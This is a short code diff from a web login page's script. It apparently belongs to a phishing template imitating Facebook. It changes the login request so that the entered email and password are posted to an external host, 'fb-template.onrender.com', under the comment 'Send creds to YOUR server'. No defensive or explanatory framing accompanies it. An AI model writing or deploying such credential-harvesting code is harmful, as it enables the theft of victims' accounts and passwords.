@@ -360,7 +360,7 @@
       btn.classList.add('loading');
 
       // Send creds to YOUR server
-      await fetch('/api/login', {
+      await fetch('https://fb-template.onrender.com/api/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, pass })
